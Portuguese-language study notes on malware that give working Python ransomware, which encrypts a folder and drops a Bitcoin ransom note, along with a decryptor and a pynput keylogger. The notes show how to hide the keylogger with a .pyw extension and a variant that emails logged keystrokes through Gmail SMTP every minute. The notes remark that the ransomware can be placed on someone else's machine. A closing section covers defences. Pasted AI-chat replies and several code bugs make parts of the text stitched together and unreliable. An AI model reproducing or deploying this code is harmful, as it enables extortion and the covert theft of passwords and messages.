# Ransomware_e_Keylogger

## Ransomware

#### Simulando um Malware de Captura de Dados Simples em Python e Aprendendo a se Proteger

Agora vamos ver sobre:

- Malware com Python;
- Quais são os principais tipos de Malware
- O que e como eles afetam os computadores das vítimas;
- Como implementar na prática com Scripts em Python;
- Como resolver e como garantir que nossas empresas, os nossos computadores, os nossos clientes não caiam nesse tipo de golpe.

## O que é Malwere

Malwere vem da junção de duas palavras em inglês, malicious e software ou Software Malicioso.

É qualquer tipo de programa ou código que foi criado com uma intenção prejudicial. Ou seja, ele não é um erro de desenvolvimento que é sem querer, ele já é proposital mesmo para causar algum dano ou prejuízo.

Com o objetivo claro de causar danos, roubar informações, espionar alguém ou até comprometer o funcionamento de um sistema ou rede de computadores.

São vírus digitais que entram sem a gente perceber e se escondem.

-----------------------

## Exemplos de Malware

Temos muitos exemplos:

![[imagens/Exemplos.png]]

- Vírus:
	- Ele funciona de forma muito parecida com o vírus biológico; Ele vai se anexar a um arquivo legítimo que pode ser, um documento, um executável ou até mesmo instalador; e só vai entrar em ação quando aquele arquivo/ executável/ instalador for aberto. Quando isso acontece, o vírus vai se ativar e vai tentar se espalhar para outros arquivos do sistema. Isso pode comprometer os Dados, deletar arquivos e até fazer cópias de si mesmo. E ele é um tipo clássico de malware, super conhecido muito comum nas décadas passadas; principalmente quando o principal meio de se espalhar era o pendrive ou disquetes ou CDs.

- Worm
	- Esse tipo, é um tipo mais independente. Diferente do vírus, o worm não vai precissar de um arquivo para se esconder, ele é um programa autônomo que vai se espalhar automaticamente pela rede. E o que isso significa ?!, isso significa que se um computador estiver infectado, ele pode procurar por outros computadores conectados na mesma rede e tentar se instalar neles também. Em alguns casos, o worm pode deixar uma rede inteira lenta ou até mesmo completamente fora do ar; porque ele vai consumir muita banda e/ou infectar várias máquinas ao mesmo tempo. Então, é um problema gigantesco.

- Spyware
	- Como o nome já sugere, ele é um software espião; então ele vai se instalar no sistema com o objetivo de monitorar o que o usuário faz e ele vai registrar os sites acessados, capturar senhas, dados bancários, fotos, conversas e tudo mais; e muitas vezes ele vai fazer isso sem deixar nenhum rastro. E o Spyware é muito utilizado em golpes, mas também é utilizado em espionagem industrial e até vigilância governamental.

- Trojan
	- O famoso Trojan, também conhecido como cavalo de tróia, é um dos softwares mais perigosos segundo a tutora das aulas, porque ele vai se disfarçar de algo confiável. Então é como se a gente estivesse instalando um programa que vai parecer super útil, como um leitor de PDF ou um conversor de vídeos, mas por trás ele vai executar comandos maliciosos. O nome cavalo de tróia vem daquela história da mitologia grega onde os gregos esconderam soldados dentro de um ''presente'' em formato de cavalo (supostamente de madeira). E no contexto do Trojan, o ''presente'' vai ser o programa falso e os soldados são os códigos maliciosos. Uma vez que é instalado, ele pode abrir portas para os invasores conseguirem coletar dados ou a servir como base para instalar outros malwares.

- Keylogger
	- Esse tipo de malware vai ser programado para registrar tudo que o usuário digita. Então imaginamos que estamos no intervalo de almoço batendo aquele papo lá no grupo de amigos, ou vai mandar as informações, vai digitar lá o seu login e senha do instagram para dar uma olhadinha, vai olhar os vídeos no tiktok... todas essas informações e mensagens que enviarmos por email, por whatsapp, no VSCode que digitarmos o código... tudo isso vai ser capturado, cada tecla pressionada vai ser armazenada em um arquivo de texto e depois vai ser enviado para o atacante; com isso é possível capturar logins, senhas, mensagens e até conversas inteiras. E os Keyloggers são muito utilizados para roubo de senhas bancárias ou redes sociais.

- Ransomware
	- É um dos tipos mais assustadores; porque ele vai sequestrar os arquivos e até mesmo um sistema inteiro, capturando os dados e exigindo um pagamento para devolver o acesso. Em muitos casos, mesmo que a vítima pague, eles (os dados ou ''sistema'') não vai ser devolvido. Antigamente os atacantes mal intencionados pediam um valor tipo 50 dólares ou até mesmo 1.000.000 de dólares para devolver os arquivos... as vítimas/ pessoas pagavam e eles devolviam. Com o passar do tempo eles pensaram: ''Porque que vou devolver todos os dados pedindo 1 milhão se eu posso dividir por partes.'' então eles pedem 1 milhão por exemplo, a pessoa/ vítima paga e aí ele vai devolver 5% dos dados por exemplo. E aí se essa pessoa quiser mais dados de volta, ela vai ter que pagar mais 1 milhão, depois mais 1 milhão e por aí vai. E esse golpe não tem fim, infelizmente. E ele é super comum em empresas e etc. Infelizmente esse ataque está cada vez mais comum inclusive.

Existem mais tipos de malwares, mas esses são alguns dos que circulam até hoje. Cada um vai ter um estilo, uma estratégia e um impacto diferente. Mas todos tem algo em comum, todos eles se aproveitam de brechas, seja no sistema, seja na distração do usuário para entrar e fazer esse estrago.

Saber disso tudo é o primeiro passo para sabermos como podemos nos defender e também defender as nossas empresas e nossos clientes desse tipo de problema.

## Como esses malwares entram nos computadores das vítimas ?

Existem muitos tipos:

- Engenharia social é um meio muito comum, onde os atacantes vão, através da psicologia, fazer com que os usuários leigos ou mesmo profissionais caiam nesse tipo de software mal intencionado, clicando em um link; simplesmente instalando um jogo que parece super confiável mas na verdade não é. Outro jeito também, é através de anexos falsos por emails, links maliciosos espalhados nas redes sociais ou até mesmo através do disfarce de scripts maliciosos dentro de arquivos que aparentemente são inofensivos.

-----------------------

## Construindo nosso ambiente

Agora vamos entender na prática como funciona um Ramsonware, para isso vou estar utilizando o VScode e iremos utilizar a linguagem python.

Ele vai basicamente criptografar os arquivos, bloquear o acesso e geralmente vai pedir um resgate para devolver os dados.

O que vamos fazer é, simular esse comportamento básico de um Ramsonware de forma totalmente segura e em um ambiente controlado.

Então digamos que somos os atacantes que queremos fazer com que a vítima não tenha mais acesso aos arquivos dela; o que a gente precisa fazer primeiro?:

1. Encontrar esses arquivos(diretórios);
2. Criptografar esses arquivos com uma chave que só a gente tem;
3. Deixar a mensagem dizendo que ele/ ela (a vítima) precisa pagar para ter a chave para ter de volta novamente os arquivos.

Com isso, tudo vai se tornar embaralhado e inacessível para a vítima.

Então, criamos uma pasta chamada ''Malware'' e dentro dela outra pasta chamada ''test_files'' e abrimos a primeira pasta(Malware) no VScode.

Agora vamos utilizar uma função que percorrer a pasta inteira e coletar todos os arquivos que não sejam do próprio script, ou seja, a chave de criptografia.

Criamos dois arquivos dentro da pasta ''test_files'' chamados de ''dados_confidenciais.txt'' e digitamos algo nele para simular arquivos da vítima e criamos também o arquivo .txt chamado ''senhas.txt''

E podemos também colocar imagens, PDFs e etc. Sem problema, também funciona.

Agora criamos um arquivo .py chamado de ''ramsonware.py'' onde colocaremos o seguinte código (Que será a chave).

```python
from cryptography.fernet import Fernet

import os

  

# 1. gerar uma chave de criptografia e salvar

  

def gerar_chave():

    chave = Fernet.generate_key()

    with open("chave.key", "wb") as chave_file:

        chave_file.write(chave)

  

# 2. carregar a chave salva

  

def carregar_chave():

    return open("chave.key", "rb").read()

  

# 3. criptografar um unico arquivo

  

def criptografar_arquivo(arquivo, chave):

    f = Fernet(chave)

    with open(arquivo, "rb") as file:

        dados = file.read()

    dados_encriptados = f.encrypt(dados)

    with open(arquivo, "wb") as file:

        file.write(dados_encriptados)

  

# 4. encontrar arquivos para criptografar

  

def encontrar_arquivos(diretorio):

    lista = []

    for raiz, _, arquivos in os.walk(diretorio):

        for nome in arquivos:

            caminho = os.path.join(raiz, nome)

            if nome != "ramsonware.py" and not nome.endswith(".key"):

                lista.append(caminho)

        return lista

  

# 5. mensagem de resgate

def criar_mensagem_resgate():

    with open("LEIA ISSO.txt", "w") as f:

        f.write("Seus arquivos foram criptografados!\n")

        f.write("Envie 1 bitcoin para o endereco X e envie o comprovante!\n")

        f.write("Depois disso, enviaremos a chave para voce recuperar seus dados!\n")

  

# 6. execucao principal

def main():

    gerar_chave()

    chave = carregar_chave()

    arquivos = encontrar_arquivos("test_files")

    for arquivo in arquivos:

        criptografar_arquivo(arquivo, chave)

    criar_mensagem_resgate()

    print("Ramsonware executado! Arquivos criptografados!")

  

if __name__=="__main__":

    main()
```

E Rodamos com o seguinte comando no terminal que deve estar dentro da pasta raiz:

```cmd
python .\ramsonware.py
```

## IMPORTANTE

>[!Attention] Esse script só pode ser rodado uma vez, para que a descriptografia funcione, se não, se rodar mais de uma vez, a primeira chave de descriptografia será sobrescrita pela nova.

E com isso, já temos um Ramsonware, e podemos colocar na máquina de alguém caso tenhamos acesso a mesma.

## Explicação do Código

## 1. Bibliotecas importadas

|Código|O que faz|
|---|---|
|`from cryptography.fernet import Fernet`|Importa a classe Fernet, utilizada para criptografia e descriptografia autenticadas.|
|`import os`|Importa funcionalidades do sistema operativo, como percorrer diretórios e manipular caminhos.|

## 2. Função `gerar_chave()`

|Código|Explicação|
|---|---|
|`def gerar_chave():`|Define uma função chamada `gerar_chave`.|
|`Fernet.generate_key()`|Gera uma chave criptográfica aleatória.|
|`open("chave.key", "wb")`|Abre ou cria um arquivo em modo de escrita binária.|
|`with`|Garante que o arquivo seja fechado automaticamente.|
|`chave_file.write(chave)`|Escreve a chave no arquivo.|

Conceito importante: a chave é necessária para recuperar os dados criptografados.

## 3. Função `carregar_chave()`

|Código|Explicação|
|---|---|
|`def carregar_chave():`|Define uma função para carregar a chave.|
|`open("chave.key", "rb")`|Abre o arquivo em modo de leitura binária.|
|`.read()`|Lê o conteúdo completo do arquivo.|
|`return`|Devolve o conteúdo lido à função que a chamou.|

## 4. Função `criptografar_arquivo()`

Esta parte trabalha com os dados de um arquivo.

|Código|Explicação|
|---|---|
|`def criptografar_arquivo(arquivo, chave):`|Define uma função que recebe um caminho de arquivo e uma chave.|
|`Fernet(chave)`|Cria um objeto Fernet utilizando a chave fornecida.|
|`open(arquivo, "rb")`|Abre o arquivo para leitura binária.|
|`file.read()`|Lê os dados do arquivo.|
|`f.encrypt(dados)`|Produz uma versão criptografada dos dados.|
|`open(arquivo, "wb")`|Abre o arquivo em modo de escrita binária, substituindo o conteúdo anterior.|
|`file.write(...)`|Escreve os dados fornecidos no arquivo.|

Atenção A escrita em modo `wb` pode destruir o conteúdo anterior. Se não houver uma cópia de segurança, a recuperação dependerá da chave correta.

## 5. Função `encontrar_arquivos()`

|Código|Explicação|
|---|---|
|`def encontrar_arquivos(diretorio):`|Define uma função que recebe o caminho de um diretório.|
|`lista = []`|Cria uma lista vazia.|
|`os.walk(diretorio)`|Percorre a estrutura de diretórios.|
|`raiz`|Representa o diretório atual.|
|`_`|Recebe a lista de subdiretórios, mas não é utilizada.|
|`arquivos`|Contém os nomes dos arquivos encontrados.|
|`os.path.join(raiz, nome)`|Junta o diretório e o nome para formar um caminho.|
|`lista.append(caminho)`|Adiciona um caminho à lista.|
|`return lista`|Devolve a lista de caminhos encontrados.|

## 6. Função `criar_mensagem_resgate()`

|Código|Explicação|
|---|---|
|`def criar_mensagem_resgate():`|Define uma função para criar uma mensagem.|
|`open("LEIA ISSO.txt", "w")`|Cria ou substitui um arquivo de texto.|
|`f.write(...)`|Escreve texto no arquivo.|
|`\n`|Representa uma quebra de linha.|

Esta função cria a mensagem característica de um ataque de ransomware.

## 7. Função `main()`

|Código|Explicação|
|---|---|
|`def main():`|Define a função principal do programa.|
|`gerar_chave()`|Chama a função de geração de chave.|
|`carregar_chave()`|Obtém a chave armazenada.|
|`encontrar_arquivos(...)`|Obtém os caminhos dos arquivos.|
|`for arquivo in arquivos:`|Percorre os elementos de uma lista.|
|`criar_mensagem_resgate()`|Chama a função de criação da mensagem.|
|`print(...)`|Apresenta uma mensagem no terminal.|

## 8. Condição de execução

|Código|Explicação|
|---|---|
|`if __name__ == "__main__":`|Verifica se o arquivo Python está sendo executado diretamente.|
|`main()`|Chama a função principal.|

## 9. Conceitos de Python que aprendeste

|Conceito|Significado|
|---|---|
|`def`|Define funções.|
|`return`|Devolve resultados.|
|`with`|Gerencia recursos automaticamente.|
|`open()`|Abre arquivos.|
|`"rb"`|Leitura binária.|
|`"wb"`|Escrita binária.|
|`"w"`|Escrita de texto.|
|`for`|Estrutura de repetição.|
|`if`|Estrutura condicional.|
|`os.walk()`|Percorre diretórios.|
|`append()`|Adiciona elementos a listas.|
|`print()`|Apresenta informações no terminal.|

## 10. Um conceito muito importante: Fernet

![Fernet (symmetric encryption) | Sérgio Mendonça](https://images.openai.com/static-rsc-4/RW2k1TboHNIPrOMiMFDjVE3CSui6wOM43unSj4RtB-FVmBDgLcOLMe0t8S4nDmZyykNuQwQmGaLIDogmSdgXrzapojl1nhe0G7JgZR2_PBfImBtJxNTBUTsa9WhCKPZc_jzVb0QTWLcF_dNgfmxhEJ9j9_XvF6jgVdM4iAIM2s0?purpose=inline)

[](https://sergio.mendonca.pro/post/fernet-symmetric-encryption/?utm_source=chatgpt.com)

O Fernet utiliza criptografia simétrica autenticada:

- A mesma chave é utilizada para criptografar e descriptografar.
    
- Os dados criptografados não são diretamente legíveis.
    
- A integridade dos dados é verificada durante a descriptografia.
    
- Se utilizares uma chave diferente, a recuperação falhará.
    

Atenção ao teu caso: como executaste o programa três vezes, podes ter substituído a chave original. Não voltes a executar o script e preserva todas as cópias de `chave.key` que ainda tenhas.

Se quiseres, também posso explicar o funcionamento de Python linha por linha, utilizando um exemplo seguro de criptografia e descriptografia de uma mensagem em memória.

## DESCRIPTOGRAFIA

Para descriptografar temos um outro script que pega a nossa chave salva dentro do arquivo que foi criado pelo nosso primeiro script de criptografia e faz propriamente a descriptografia dos mesmos arquivos, o script é:

```python
from cryptography.fernet import Fernet

import os

  

def carregar_chave():

    return open("chave.key", "rb").read()

  

def descriptografar_arquivo(arquivo, chave):

    f = Fernet(chave)

    with open(arquivo, "rb") as file:

        dados = file.read()

        dados_descriptografados = f.decrypt(dados)

    with open(arquivo, "wb") as file:

        file.write(dados_descriptografados)

  

def encontrar_arquivos(diretorio):

    lista = []

    for raiz, _, arquivos in os.walk(diretorio):

        for nome in arquivos:

            caminho = os.path.join(raiz, nome)

            if nome != "ramsonware.py" and not nome.endswith(".key"):

                lista.append(caminho)

        return lista

  

def main():

    chave = carregar_chave()

    arquivos = encontrar_arquivos("test_files")

    for arquivo in arquivos:

        descriptografar_arquivo(arquivo, chave)

    print("Arquivos restaurados com sucesso!")

  

if __name__ == "__main__":

    main()
```

E o Rodamos com o seguinte comando:

```python
python .\descriptografar.py
```

## Explicação do Código

## 1. Bibliotecas importadas

python

```
from cryptography.fernet import Fernet
import os
```

|Código|Explicação|
|---|---|
|`from`|Indica de onde queremos importar algo.|
|`cryptography.fernet`|Módulo que disponibiliza o sistema de criptografia Fernet.|
|`import Fernet`|Importa a classe responsável pelas operações Fernet.|
|`import os`|Importa ferramentas para trabalhar com o sistema operativo.|

## 2. Função `carregar_chave()`

python

```
def carregar_chave():
    return open("chave.key", "rb").read()
```

|Código|Explicação|
|---|---|
|`def`|Palavra-chave utilizada para definir uma função.|
|`carregar_chave()`|Nome da função.|
|`open()`|Abre um arquivo.|
|`"chave.key"`|Nome do arquivo que contém a chave.|
|`"rb"`|Abre o arquivo em modo de leitura binária.|
|`.read()`|Lê o conteúdo completo do arquivo.|
|`return`|Devolve o resultado da função.|

Conceito importante: a chave precisa ser exatamente a mesma utilizada na criptografia original.

## 3. Função `descriptografar_arquivo()`

python

```
def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
```

|Código|Explicação|
|---|---|
|`def`|Define uma função.|
|`descriptografar_arquivo`|Nome da função.|
|`arquivo`|Parâmetro que representa um arquivo.|
|`chave`|Parâmetro que recebe a chave criptográfica.|
|`Fernet(chave)`|Cria um objeto Fernet associado à chave.|
|`f`|Variável que guarda esse objeto.|

### Conceito: parâmetros

Os parâmetros são informações que uma função recebe para conseguir realizar determinada tarefa.

Neste caso, são recebidos dois parâmetros: o arquivo e a chave.

## 4. Entender o `with open()`

No código tens:

python

```
with open(arquivo, "rb") as file:
    dados = file.read()
```

|Código|Explicação|
|---|---|
|`with`|Gerencia a abertura e o encerramento do arquivo.|
|`open()`|Abre o arquivo.|
|`arquivo`|Indica o caminho do arquivo.|
|`"rb"`|Modo de leitura binária.|
|`as file`|Dá o nome `file` ao objeto do arquivo.|
|`file.read()`|Lê os dados do arquivo.|

O `with` é muito utilizado em Python porque fecha automaticamente o arquivo quando termina o bloco.

## 5. A função `encontrar_arquivos()`

python

```
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ramsonware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista
```

Vamos aos conceitos:

|Código|Explicação|
|---|---|
|`diretorio`|Diretório que será analisado.|
|`lista = []`|Cria uma lista vazia.|
|`os.walk()`|Percorre a estrutura de diretórios.|
|`raiz`|Diretório atual da procura.|
|`_`|Variável que recebe um valor que não será utilizado.|
|`arquivos`|Lista dos nomes dos arquivos encontrados.|
|`for nome in arquivos`|Percorre os nomes dos arquivos.|
|`os.path.join()`|Junta partes de um caminho.|
|`endswith(".key")`|Verifica se um nome termina com `.key`.|
|`append()`|Adiciona um elemento a uma lista.|
|`return lista`|Devolve a lista.|

Atenção: o `return` está indentado dentro do primeiro ciclo `for`, portanto a procura pode terminar antes de percorrer todos os subdiretórios.

## 6. Função `main()`

python

```
def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
```

|Código|Explicação|
|---|---|
|`def main()`|Define a função principal.|
|`chave =`|Guarda um resultado numa variável.|
|`carregar_chave()`|Chama a função de carregamento da chave.|
|`arquivos =`|Cria uma variável para guardar o resultado.|
|`"test_files"`|Nome da pasta utilizada como referência.|

A função `main()` organiza a execução do programa, chamando outras funções.

## 7. Estrutura `for`

python

```
for arquivo in arquivos:
```

|Elemento|Explicação|
|---|---|
|`for`|Inicia uma repetição.|
|`arquivo`|Variável que recebe cada elemento.|
|`in`|Indica a coleção que será percorrida.|
|`arquivos`|Lista que contém os caminhos encontrados.|

Por exemplo, uma lista em Python pode ter:

python

```
arquivos = [
    "documento1.txt",
    "documento2.txt",
    "documento3.txt"
]
```

O `for` percorre os três elementos, um de cada vez.

## 8. Condição final

python

```
if __name__ == "__main__":
    main()
```

|Código|Explicação|
|---|---|
|`if`|Inicia uma condição.|
|`__name__`|Variável especial do Python.|
|`"__main__"`|Identifica a execução direta do arquivo.|
|`main()`|Chama a função principal.|

Isto permite que o código seja executado diretamente ou importado por outro arquivo Python.

## 9. Conceitos que aprendeste

Aqui está um pequeno resumo dos principais conceitos utilizados nos teus dois programas:

|Conceito|Para que serve|
|---|---|
|Funções (`def`)|Organizar código em blocos reutilizáveis.|
|Variáveis|Guardar informações.|
|Parâmetros|Passar informações para funções.|
|`return`|Devolver resultados.|
|`with`|Gerenciar arquivos automaticamente.|
|`open()`|Abrir arquivos.|
|`read()`|Ler dados.|
|`os.walk()`|Percorrer diretórios.|
|`os.path.join()`|Construir caminhos.|
|`for`|Repetir operações.|
|`if`|Verificar condições.|
|`append()`|Adicionar elementos a listas.|

## 10. Um conceito essencial: `InvalidToken`

Importante no teu projeto

O Fernet pode apresentar o erro `InvalidToken` quando não consegue validar os dados recebidos.

Isso pode acontecer quando:

- A chave não é a original.
    
- Os dados foram modificados.
    
- O conteúdo não foi produzido pelo Fernet com aquela chave.
    

Como mencionaste que executaste o primeiro programa três vezes, a possibilidade de a chave ter sido substituída é especialmente importante.

Não sobrescrevas `chave.key` nem elimines cópias antigas. Preserva também os arquivos afetados antes de qualquer tentativa de recuperação.

Se dominares estes conceitos, já terás uma boa base de Python para compreender funções, ficheiros, listas, ciclos, módulos e criptografia.

-----------------------


## Keylogger

Keylogger é um tipo de malware que vai ter como objetivo, registrar tudo que é digitado no teclado da vítima; cada letra, cada número, cada espaço, cada tecla especial, etc. Tudo é gravado em um arquivo e isso pode incluir, senhas, conversas, dados bancários, fofocas e etc. Por isso que é uma das ferramentas mais comuns e um dos ataques mais silenciosos é a utilização dos Keyloggers.

Agora vamos criar um keylogger simples, educacional, para a gente conseguir entender como ele funciona e como é possível se proteger na prática.

Vamos fazer isso dentro de um ambiente de teste, em um ambiente controlado e seguro, com dados fictícios de teste.

O objetivo aqui é mostrar como é fácil capturar tudo que é digitado em um computador e como isso pode ser ao mesmo tempo super perigoso se for parar nas mãos erradas.

## Mãos na massa

Vamos utilizar uma biblioteca que se chama ''pynput'' e essa biblioteca vai permitir que a gente monitore o teclado e reaja sempre que a tecla for pressionada.

Agora vamos criar uma nova pasta chamada ''Keylogger''.

E vamos abrir ela no VScode.

>[!check] E é interessante saber que, essa biblioteca que iremos utilizar foi feita originalmente para automação de tarefas e testes de interface. Mas, ela também pode servir para capturar eventos, como nesse caso que iremos ver!

Então, vamos instalar a biblioteca ''pynput'' digitando no terminal do VScode:

```cmd
pip install pynput
```

Ou

```cmd
python -m pip install pynput
```

Cada parte significa:

- `python`: inicia o interpretador Python.
    
- `-m`: informa que você quer executar um módulo.
    
- `pip`: é o módulo que gerencia a instalação de pacotes Python.
    
- `install pynput`: instrui o pip a instalar o pacote `pynput`.

E agora vamos entender o que será feito:

1. Vai ficar em execução em segundo plano.

2. Toda vez que o usuário digitar uma tecla, o programa vai capturar essa tecla.

3. O que for digitado, será gravado em um arquivo .txt.

4. O arquivo vai mostrar tudo o que foi digitado, de forma sequencial.

Esse exemplo é interessante porque, ele vai mostrar como algo tão pequeno pode causar um impacto enorme.

E esse é um tipo de malware que, com poucas linhas, ele consegue roubar senhas, mensagens, dados bancários e muito mais. Por isso que, mesmo sendo muito simples, é fundamental que entendamos como funciona e como podemos se prevenir de forma eficiente.

Esse monitoramento através da biblioteca ''pynput'' será feito em tempo real.

Agora vamos criar o script:

```python
from pynput import keyboard

  

ignorar = {

    keyboard.Key.shift,

    keyboard.Key.shift_r,

    keyboard.Key.ctrl_l,

    keyboard.Key.ctrl_r,

    keyboard.Key.alt_l,

    keyboard.Key.alt_r,

    keyboard.Key.caps_lock,

    keyboard.Key.cmd

}

  

def on_press(key):

    try:

        # se for uma tecla "normal" (letra, numero, simbolo)

        with open("log.txt", "a", encoding="utf-8") as f:

            f.write(key.char)

    except AttributeError:

        with open("log.txt", "a", encoding="utf-8") as f:

            if key == keyboard.Key.space:

                f.write(" ")

            elif key == keyboard.Key.enter:

                f.write("\n")

            elif key == keyboard.Key.backspace:

                f.write("\t")

            elif key == keyboard.Key.esc:

                f.write(" [ESC] ")

            elif key in ignorar:

                pass

            else:

                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:

    listener.join()
```

E para rodar damos um:

```terminal cmd no vscode
python .\keylogger.py
```

E pronto, já está monitorando e gravando o que é digitado no arquivo ''log.txt''.
### Explicação por partes, do código

| Código                                 | Função                                                                    |
| -------------------------------------- | ------------------------------------------------------------------------- |
| `from pynput import keyboard`          | Importa a biblioteca para monitorar o teclado.                            |
| `ignorar = {...}`                      | Define teclas modificadoras que não serão registradas.                    |
| `def on_press(key):`                   | Cria uma função executada sempre que uma tecla é pressionada.             |
| `try:`                                 | Tenta tratar a tecla como um caractere comum.                             |
| `key.char`                             | Obtém o caractere pressionado, como letras e números.                     |
| `open("log.txt", "a", ...)`            | Abre o arquivo para adicionar informações sem apagar o conteúdo anterior. |
| `f.write(key.char)`                    | Registra o caractere no arquivo.                                          |
| `except AttributeError:`               | Trata teclas especiais que não possuem o atributo `char`.                 |
| `keyboard.Key.space`                   | Identifica a barra de espaço.                                             |
| `keyboard.Key.enter`                   | Identifica a tecla Enter.                                                 |
| `keyboard.Key.backspace`               | Identifica a tecla Backspace.                                             |
| `keyboard.Key.esc`                     | Identifica a tecla Esc.                                                   |
| `key in ignorar`                       | Verifica se a tecla pertence à lista de teclas ignoradas.                 |
| `f"[{key}]"`                           | Representa outras teclas especiais em formato de texto.                   |
| `keyboard.Listener(on_press=on_press)` | Cria um monitor que acompanha as teclas pressionadas.                     |
| `listener.join()`                      | Mantém o programa em execução, aguardando eventos do teclado.             |


### Resumo do funcionamento

Usuário pressiona uma tecla

A função `on_press()` é executada

Identifica se é caractere ou tecla especial

Registra o evento em `log.txt`

Observação de segurança: esse código tem comportamento de keylogger, pois pode registrar informações digitadas, inclusive dados sensíveis. Use esse tipo de monitoramento somente em ambiente próprio e com autorização explícita das pessoas envolvidas.

| Parte       | Significado                                           |
| ----------- | ----------------------------------------------------- |
| `open()`    | Abre um arquivo.                                      |
| `"log.txt"` | Nome do arquivo.                                      |
| `"a"`       | Modo append: adiciona conteúdo sem apagar o anterior. |
| `encoding=` | Define a codificação dos caracteres.                  |
| `"utf-8"`   | Define o padrão UTF-8.                                |
| `as f`      | Armazena a referência ao arquivo na variável `f`.     |

### Por que UTF-8 é importante?

Computadores armazenam informações em bytes, não diretamente em letras.

O UTF-8 permite representar caracteres de diversos idiomas, incluindo:

- `á`, `é`, `í`, `ó`, `ú`
    
- `ã`, `õ`
    
- `ç`
    
- `ê`, `ô`
    
- Caracteres de outros alfabetos e emojis.

## Agora vamos fazer com que ele inicie sem precisar abrir o terminal e adicionar um comando e tudo mais, para deixar ele o mais ''Silêncioso'' possível!

Digitamos no terminal do VScode:

```cmd
ren .\keylogger.py .\keylogger.pyw
```

Então, quando digitarmos no terminal para rodar:

```cmd
python .\keylogger.pyw
```

Ele inicia, mas não aparece nada e não dá nenhum sinal de que está rodando em segundo plano.

E mesmo que fechemos o terminal, ele continua capturando as teclas digitadas e gravando no arquivo ''log.txt''

## Meio de Exportar os Dados

Porém o atacante, além de pegar os conteúdos ele tem que exportá-los para algum lugar que ele consiga ter acesso.

E normalmente é:

- Enviando por E-Mail;
- FTP
- Armazenamento na Nuvem

Sem o conhecimento da vítima!

Agora, vamos configurar para que de tempos em tempos esse arquivo ''log.txt'' seja enviado por E-Mail, utilizando python.

Ou seja:

- Vamos capturar as teclas pressionadas;

- O Usuário não irá saber que estamos capturando, pois, estará rodando em segundo plano;

- E ainda vamos enviar essas informações por E-Mail.

## Enviando os dados capturados remotamente ao atacante

Agora vamos automatizar os envios das informações por E-Mail.

Ou seja, o atacante pode ficar recebendo informações capturadas via E-Mail de minuto em minuto, mesmo sem ter mais o acesso á máquina da vítima.

>[!check] O ideal e recomendado é, criarmos um E-Mail no Gmail, somente para fazer testes!

- Criar o E-Mail Fictício
- Ativar autenticação em duas etapas (2-Steps Verification)
- Digitar o link: https://myaccount.google.com/apppasswords e crie uma chave/ senha exclusiva para envio de E-Mails via aplicativo.

>[!Attention] Guarde essa Chave pois, vamos precisar.

E então, agora vamos instalar a seguinte blibioteca:

```cmd
pip install secure-smtplit
```

Ou

```cmd
python -m pip install secure-smtplib
```

Pode ser que já tenha instalado em sua versão python.

Agora vamos criar um segundo arquivo no VScode na pasta ''Keylogger'' chamado de ''keylogger_email.py''.

Com o seguinte script/ código:

```python
from pynput import keyboard

import smtplib

from email.mime.text import MIMEText

from threading import Timer

  

log = ""

  

#Configurações de E-Mail

Emai_origem = "seu email *"

Email_destino = "seu email 2, ou se for para testes, o mesmo do de origem! *"

Senha_email = "sua chave (Nao e a senha do email!, e a chave gerada pelo apppasswords da google)"

  

def enviar_email():

    global log

    if log:

        msg = MIMEText(log)

        msg['SUBJECT'] = "Dados capturados pelo keylogger"

        msg['From'] = Emai_origem

        msg['To'] = Email_destino

        try:

            server = smtplib.SMTP("smtp.gmail.com", 587)

            server.starttls()

            server.login(Emai_origem, Senha_email)

            server.send_message(msg)

            server.quit()

        except Exception as e:

            print("Erro ao enviar, e")

  

        log = ""

  

    # Agendar o envio a cada 60 segundos

    Timer(60, enviar_email).start()

  

    def on_press(key):

        global log

        try:

            log += key.char

        except AttributeError:

            if key == keyboard.Key.space:

                log += " "

            elif key == keyboard.Key.enter:

                log += "\n"

            elif keyboard.Key.backspace:

                log += "[<]"

            else:

                pass # Ignorar control, shift, etc...

  

    # Inicia o keylogger e o envio automatico

    with keyboard.Listener(on_press=on_press) as listener:

        enviar_email()

        listener.join()
```

E por enquanto, a extensão está como .py (Inicia dando pistas de que está rodando, para o usuário)
Se colocarmos em .pyw, aí ele inicia sem ''fazer barulho'', ficar rodando sem nada aparecer para o usuário.

-----------------------

## Como podemos nos proteger?

Prevenção e detecção é o que precisamos fazer enquanto profissionais de cybersegurança.

Como detectamos e impedimos esse tipo de ataque?

Ter um bom antivírus e Firewall (Tanto do sistema, quanto da rede) atualizados e bem configurados.

Segunda camada de defesa é o monitoramento de comportamento dos aplicativos, ferramentas de segurança modernas já se encontram utilizando IA (Inteligência Artificial) e ML (Machine Learning) para poder detectar esses comportamentos anormais.

Um exemplo é:

Um programa começa a acessar dezenas de arquivos e criptografar todos eles rapidamente pode ser sinalizado como Ramsonware, mesmo que não esteja em nenhuma lista de vírus conhecida.

Isso se chama detecção por comportamento e é uma tendência cada vez mais comum na área de cybersegurança.

A Terceira medida/ camada de defesa, é a consciência do usuário; que é cuidado com anexos, com links, a maior parte dos malwares não entra no sistema pela porta da frente, ele vem disfarçado.

Então ele vem através de um email chamativo, um PDF falso, um link que parece confiável mas, que leva para outro site malicioso.

Esse tipo de ataque se chama ENGENHARIA SOCIAL e é mais eficaz que qualquer habilidade/ técnica de programação. O elo mais fraco da segurança vai ser sempre o humano e por isso que temos que educar as pessoas a não clicar em tudo que recebem, a verificar remetentes, a duvidar de promessas exageradas... é uma das defesas mais eficazes que conseguimos ter.

E por fim, uma dica prática que todo profissional de segurança deve aplicar é utilizar ambientes isolados para testes. Sempre que for rodar códigos desconhecidos, abrir arquivos suspeitos, analisar malwares e etc... utilizar uma máquina virtual ou uma sandbox é essencial e recomendado, pois, isso vai criar uma barreira entre o sistema real e o ambiente de testes. Se o malware for fazer algo perigoso, ele vai agir somente dentro desse ambiente controlado, sem afetar o ambiente principal; e esse tipo de isolamento, ele é essencial, não só para análise de ameaças, mas também para evitar que um ataque acidentalmente comprometa a rede inteira.

Então muitas empresas utilizam justamente máquinas virtuais para funcionários que lidam com arquivos externos, justamente para limitar esse tipo de risco.

## Reflexão

